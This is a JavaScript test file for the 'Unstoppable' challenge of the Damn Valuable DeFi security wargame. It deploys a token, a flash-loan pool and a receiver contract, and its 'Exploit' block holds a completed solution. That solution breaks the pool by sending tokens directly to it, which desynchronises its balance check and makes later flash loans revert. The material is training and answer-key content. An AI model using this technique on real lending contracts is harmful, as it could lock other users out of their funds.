const { ether, expectRevert } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');

const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
const UnstoppableLender = contract.fromArtifact('UnstoppableLender');
const ReceiverContract = contract.fromArtifact('ReceiverUnstoppable');

const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {

    const [deployer, attacker, someUser, ...otherAccounts] = accounts;

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ether('1000000');
    const INITIAL_ATTACKER_BALANCE = ether('100');

    // SETUP SCENARIO
    before(async function () {
        
        // Contract instances
        this.token = await DamnValuableToken.new({ from: deployer });
        this.pool = await UnstoppableLender.new(this.token.address, { from: deployer });

        // Deployer deposits 1.000.000 ETH into Pool
        await this.token.approve(this.pool.address, TOKENS_IN_POOL, { from: deployer });
        await this.pool.depositTokens(TOKENS_IN_POOL, { from: deployer });

        // Transfer 100 ETH to Attacker
        await this.token.transfer(attacker, INITIAL_ATTACKER_BALANCE, { from: deployer });

        
        // Pool now has 1M ETH
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.bignumber.equal(TOKENS_IN_POOL);
        // let bal = await this.pool.poolBalance()
        // console.log('Tokens after transfer:', bal.toString());

        // Attacker has now 100 ETH
        expect(
            await this.token.balanceOf(attacker)
        ).to.be.bignumber.equal(INITIAL_ATTACKER_BALANCE);

         // Show it's possible for anyone to take out a flash loan
         this.receiverContract = await ReceiverContract.new(this.pool.address, { from: someUser });
         await this.receiverContract.executeFlashLoan(10, { from: someUser });
    });

    it('Exploit', async function () {
        /* Get attacker's token balance */
        let attackersBalance = await this.token.balanceOf(attacker);
        /* Change the pool's balance with a transfer */
        await this.token.transfer(this.pool.address, attackersBalance, { from: attacker });
    });

    after(async function () {
        /** SUCCESS CONDITION */
        await expectRevert.unspecified(
            this.receiverContract.executeFlashLoan(10, { from: someUser })
        );
    });
});


